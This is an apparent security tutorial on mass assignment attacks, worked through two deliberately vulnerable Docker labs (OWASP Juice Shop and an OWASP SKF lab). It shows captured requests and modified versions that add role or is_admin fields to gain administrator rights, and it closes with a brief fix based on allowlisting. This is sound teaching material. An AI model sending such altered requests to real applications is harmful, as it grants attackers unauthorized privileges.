The **Mass Assignment Attack** is based on the manipulation of input parameters of an HTTP request to create or modify fields in a data model object in the web application. Instead of adding new parameters, attackers attempt to exploit the functionality of existing parameters to modify fields that should not be accessible to the user.

For example, in a user management web application, a registration form may have fields for username, email and password. However, if the application uses a library or framework that allows bulk parameter mapping, the attacker could manipulate the HTTP request to add an additional parameter, such as the user's privilege level. In this way, the attacker could log in as a user with elevated privileges by simply adding an additional parameter to the HTTP request.

# Examples

## Example 1

To set up the lab for this example we will run the following commands:

```bash
docker pull bkimminich/juice-shop

docker run -dit -p3000:3000 --name JuiceShop bkimminich/juice-shop
```

After this we are going to enter *localhost* on port *3000* and we are going to *register* in the login panel, registering this web request with **BurpSuite**.

We see that the body that is sent contains the following *JSON* data:

```json
{
	"email":"loki@example.com",
	"password":"Loki1234.",
	"passwordRepeat":"Loki1234.",
	"securityQuestion":{
		"id":1,"question":"Your eldest siblings middle name?",
		"createdAt":"2023-07-08T07:48:39.127Z",
		"updatedAt":"2023-07-08T07:48:39.127Z"
	},
	"securityAnswer":"SSS"
}
```

We can also see that when the registration is successful, it returns the following *JSON* data:

```json
{
	"status":"success",
	"data":{
		"username":"",
		"role":"customer",
		"deluxeToken":"",
		"lastLoginIp":"0.0.0.0",
		"profileImage":"/assets/public/images/uploads/default.svg",
		"isActive":true,
		"id":21,
		"email":"loki@example.com",
		"updatedAt":"2023-07-08T09:57:09.172Z",
		"createdAt":"2023-07-08T09:57:09.172Z",
		"deletedAt":null
	}
}
```

In the response we see that a *role* field is included whose value is *customer*. We could try to register with a new email but sending the field *role* whose value will be *admin*:

```json
{
	"email":"loki2@example.com",
	"password":"Loki1234.",
	"passwordRepeat":"Loki1234.",
	"role":"admin",
	"securityQuestion":{
		"id":1,"question":"Your eldest siblings middle name?",
		"createdAt":"2023-07-08T07:48:39.127Z",
		"updatedAt":"2023-07-08T07:48:39.127Z"
	},
	"securityAnswer":"SSS"
}
```

In this case we have been able to register as *administrator* thanks to the *role* field.

## Example 2

To set up the lab for this example we will run the following commands:

```bash
docker pull blabla1337/owasp-skf-lab:parameter-binding

docker run -it -p3000:3000 --name ParameterBinding blabla1337/owasp-skf-lab:parameter-binding
```

After this we are going to enter *172.17.0.2* on port *5000* and let's modify the *Guest* user data, registering this web request with **BurpSuite**.

Our request is as follows:

```bash
# URL-encoded
utf8=%E2%9C%93&_method=patch&authenticity_token=bjhS7tISzW9edySeLm21gwxPSP%2Be3vGMFa5oRJFnZCnemjQ4sOdUi4nvsddxtp1WgjcVBzy1im9hlcT050XtlQ%3D%3D&_method=patch&user%5Busername%5D=Guest2&user%5Btitle%5D=a%20normal%20user&commit=Update%20User

# URL-decoded with CTRL+Shift+U
utf8=â&_method=patch&authenticity_token=bjhS7tISzW9edySeLm21gwxPSP+e3vGMFa5oRJFnZCnemjQ4sOdUi4nvsddxtp1WgjcVBzy1im9hlcT050XtlQ==&_method=patch&user[username]=Guest2&user[title]=a normal user&commit=Update User
```

As we can see the response does not give us any relevant data to elevate our *privileges*, but we see that the request chains a series of fields and assigns them a value so we could try to assign the value of *admin* concatenating a new field:

```bash
# URL-decoded with CTRL+Shift+U
utf8=â&_method=patch&authenticity_token=bjhS7tISzW9edySeLm21gwxPSP+e3vGMFa5oRJFnZCnemjQ4sOdUi4nvsddxtp1WgjcVBzy1im9hlcT050XtlQ==&_method=patch&user[username]=Guest2&user[title]=a normal user&user[is_admin]=true&commit=Update User
```

In this case the value that worked is *is_admin*, but we must use our imagination with values such as *admin*, *isAdmin*, *administrator*, *privileged*, etc...

----
> One way to sanitize this type of attack is to define which properties the request should allow, and not allow the user to add as many as he wants.
----